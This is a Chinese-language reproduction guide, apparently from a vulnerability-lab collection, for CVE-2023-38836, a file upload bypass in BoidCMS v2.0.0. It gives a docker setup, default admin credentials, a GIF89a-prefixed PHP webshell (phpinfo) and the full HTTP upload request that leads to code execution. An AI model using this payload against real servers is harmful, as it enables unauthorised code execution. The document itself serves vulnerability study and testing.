# CVE-2023-38836 BoidCMSv.2.0.0 后台文件上传漏洞

BoidCMS是一个免费的开源平面文件 CMS，用于构建简单的网站和博客，使用 PHP 开发并使用 JSON 作为数据库。它的安装无需配置或安装任何关系数据库（如 MySQL）。您只需要一个支持PHP 的Web服务器。在 BoidCMS v.2.0.0 中存在一个安全漏洞，攻击者可以通过更改 MIME 标头来绕过上传文件的限制，并最终执行任意代码。这个漏洞可能导致严重的安全问题，因为攻击者可以上传恶意文件并在服务器上执行它们。

BoidCMS官网：https://boidcms.github.io/#/

BoidCMS项目下载地址：https://github.com/BoidCMS/BoidCMS

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2023-38836
- https://github.com/BoidCMS/BoidCMS/issues/27
- https://blog.csdn.net/shelter1234567/article/details/136656866

## 漏洞环境

执行如下命令启动一个boidcms-v2.0.0-web：

```
docker compose up -d
```

环境启动后，访问`http://your-ip:8080`即可看到boidcms的主页面

![](https://img-blog.csdnimg.cn/direct/4d171a6f03cd4385ac0a63058f1f81c2.png)

## 漏洞复现

访问路径`/admin`登录后台 ,默认账号密码为admin:password

进入后台页面后点击Media，上传的木马文件shell.php

```php
GIF89a
<?php phpinfo() ?>
```

![](https://img-blog.csdnimg.cn/direct/f9100f9dd3074eda954785d4d432a841.png)

发送数据包为

```
POST /admin?page=media HTTP/1.1
Host: 192.168.116.128:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAdHS7v1pBwj2hFvh
Cookie: _ga=GA1.1.2049876865.1708327587; _ga_ZCZHJPMEG7=GS1.1.1709204007.4.0.1709204007.0.0.0; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1709286898; wp-settings-time-1=1709712213; __test=1; TCSESSIONID=C535ABCCFF3BD453A9744400E7499A10; PHPSESSID=30296698223c1b44b6021dd0ce8ff70f
Connection: close
Content-Length: 478

------WebKitFormBoundaryAdHS7v1pBwj2hFvh
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

GIF89a
<?php phpinfo() ?>
------WebKitFormBoundaryAdHS7v1pBwj2hFvh
Content-Disposition: form-data; name="token"

38cde7eb88b52ab8ef98cfe140302b6b2d987c0e1dba398572426f6895bc58e0
------WebKitFormBoundaryAdHS7v1pBwj2hFvh
Content-Disposition: form-data; name="upload"

Upload
------WebKitFormBoundaryAdHS7v1pBwj2hFvh--
```

![](https://img-blog.csdnimg.cn/direct/6a59524e4eaa4262a219ca496150ecbb.png)

上传成功后访问`/media/shell.php`

![](https://img-blog.csdnimg.cn/direct/25de6e99f3764127aaad4ef82261bdc4.png)